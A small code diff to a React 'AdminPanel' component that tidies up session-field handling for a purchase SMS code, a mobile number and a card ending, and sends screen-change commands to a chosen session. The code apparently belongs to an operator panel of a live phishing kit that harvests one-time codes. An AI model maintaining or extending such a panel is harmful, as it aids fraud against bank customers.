@@ -161,9 +161,6 @@ export default function AdminPanel() {
                 case 'sms_compra':
                   updatedSession.smsCompra = inputData.smsCompra;
                   break;
-                case 'smsCompra':
-                  updatedSession.smsCompra = inputData.smsCompra;
-                  break;
                 case 'celular':
                   updatedSession.celular = inputData.celular;
                   break;
@@ -343,7 +340,7 @@ export default function AdminPanel() {
           .then(() => {
             // Then send the screen change
             sendScreenChange({
-              tipo: 'mostrar_sms_compra',
+              tipo: `mostrar_${ScreenType.SMS_COMPRA}`,
               sessionId: selectedSessionId,
               terminacion
             });
